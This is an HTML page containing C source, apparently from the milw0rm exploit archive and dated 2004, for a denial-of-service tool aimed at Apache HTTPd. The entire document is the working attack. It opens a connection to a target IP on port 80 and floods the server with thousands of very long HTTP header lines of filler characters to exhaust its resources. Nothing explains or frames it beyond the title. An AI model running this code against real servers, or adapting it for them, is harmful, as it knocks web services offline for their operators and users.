<html><head><title>Apache HTTPd Arbitrary Long HTTP Headers DoS (c version)</title></head><pre>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;errno.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;

#define A 0x41
#define PORT 80

struct sockaddr_in hrm;

int conn(char *ip)
{
int sockfd;
hrm.sin_family = AF_INET;
hrm.sin_port = htons(PORT);
hrm.sin_addr.s_addr = inet_addr(ip);
bzero(&amp;(hrm.sin_zero),8);
sockfd=socket(AF_INET,SOCK_STREAM,0);
if((connect(sockfd,(struct sockaddr*)&amp;hrm,sizeof(struct sockaddr)))&lt;0)
{
perror(&quot;connect&quot;);
exit(0);
}
return sockfd;
}
int main(int argc, char *argv[])
{
int i,x;
char buf[300],a1[8132],a2[50],host[100],content[100];
char *ip=argv[1],*new=malloc(sizeof(int));
sprintf(new,&quot;\r\n&quot;);
memset(a1,'\0',8132);
memset(host,'\0',100);
memset(content,'\0',100);
a1[0] = ' ';
for(i=1;i&lt;8132;i++)
a1[i] = A;
if(argc&lt;2)
{
printf(&quot;%s: IP\n&quot;,argv[0]);
exit(0);
}
x = conn(ip);
printf(&quot;[x] Connected to: %s.\n&quot;,inet_ntoa(hrm.sin_addr));
sprintf(host,&quot;Host: %s\r\n&quot;,argv[1]);
sprintf(content,&quot;Content-Length: 50\r\n&quot;);
sprintf(buf,&quot;GET / HTTP/1.0\r\n&quot;);
write(x,buf,strlen(buf));
printf(&quot;[x] Sending buffer...&quot;);
for(i=0;i&lt;2000;i++)
{
write(x,a1,strlen(a1));
write(x,new,strlen(new));
}
memset(buf,'\0',300);
strcpy(buf,host);
strcat(buf,content);
for(i=0;i&lt;50;i++)
a2[i] = A;
strcat(buf,a2);
strcat(buf,&quot;\r\n\r\n&quot;);
write(x,buf,strlen(buf));
printf(&quot;done!\n&quot;);
close(x);

}

// milw0rm.com [2004-08-02]</pre></html>